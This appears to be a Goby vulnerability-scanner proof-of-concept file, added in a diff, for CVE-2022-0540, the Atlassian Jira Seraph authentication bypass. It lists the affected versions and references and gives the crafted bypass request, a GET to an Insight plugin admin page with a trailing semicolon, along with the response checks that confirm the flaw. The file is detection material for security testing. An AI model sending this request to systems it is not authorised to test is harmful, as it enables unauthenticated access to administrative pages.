@@ -1,0 +1,62 @@
+{
+      "Name": "Atlassian Jira Seraph Authentication bypass CVE-2022-0540",
+      "Level": "3",
+      "Tags": [
+            "bypass"
+      ],
+      "GobyQuery": "app=\"jira\" || product=\"JIRA\" || body=\"jira\"",
+      "Description": "JIRA is a defect tracking management system developed by Atlassian, Australia, for commercial applications for defect management, task tracking, and project management.The name JIRA is not an abbreviation, but a truncation of the Japanese Gojira pronunciation.",
+      "Product": "Atlassian Jira",
+      "Homepage": "https://www.atlassian.com/",
+      "Author": "",
+      "Impact": "A vulnerability in Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.",
+      "Recommendation": "https://confluence.atlassian.com/display/JIRA/Jira+Security+Advisory+2022-04-20",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-0540",
+            "https://confluence.atlassian.com/display/JIRA/Jira+Security+Advisory+2022-04-20",
+            "https://blog.viettelcybersecurity.com/cve-2022-0540-authentication-bypass-in-seraph/"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/InsightPluginShowGeneralConfiguration.jspa;",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "General Insight Configuration",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
